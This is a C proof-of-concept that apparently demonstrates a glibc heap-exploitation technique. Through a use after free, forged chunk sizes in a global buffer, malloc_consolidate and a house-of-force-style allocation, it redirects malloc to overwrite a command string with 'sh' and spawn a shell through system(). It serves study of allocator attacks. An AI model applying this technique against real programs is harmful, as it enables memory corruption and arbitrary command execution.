#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char target[0x10] = "echo hello";
unsigned long gbuf[10] = {0};

char *ptr[0x28];

void full_tcache(int op)
{
	if(op){
		for(int i = 0; i<7; i++)
			ptr[i] = malloc(0x10);
		for(int i = 7; i<14; i++)
			ptr[i] = malloc(0x80);
	}
	else
		for(int i = 0; i<14; i++)
			free(ptr[i]);

}

int main(void){
	void *p, *fast, *small;
	char *victim;

	full_tcache(1);
	// avoid memory corruption malloc.c:3738 at (a)
	// due to chunksize_nomask(victim) which is gbuf[3] > av->system_mem which is 0x21000
	// by doing following commands, we can set av->system_mem to 0xa01000
	p = malloc(0xa00000);
	free(p);

	p = malloc(0xa00000);
	free(p);
	////////////////////////////////////////////////////////////////////////////////////////////

	fast = malloc(0x10);
	small = malloc(0x80);
	full_tcache(0);

	free(fast);

	gbuf[1] = 0x11;
	gbuf[3] = 0x21;
	gbuf[7] = 0x11;
	gbuf[9] = 0x11;

	// use after free
	*(unsigned long**)fast = &gbuf[2];
	// malloc_consolidate malloc.c:4362
	free(small);

	// minimum size (0x80000 ~ 0xa0000)
	gbuf[3] = 0x80001;
	// push gbuf[2] to large chunk
	malloc(0x1000000);                                        // (a)
	// like house of force
	gbuf[3] = 0xfffffffffffffff1;	
	// avoid size vs prev_size malloc.c:1406
	gbuf[0] = 0xfffffffffffffff0;
	// push last_remainder (ptr to target) to unsorted bin
	malloc((void*)&target-(void*)(gbuf+2)-0x20);
	// get chunk ptr to target
	victim = malloc(0x20);
	strcpy(victim, "sh");

	system(target);
}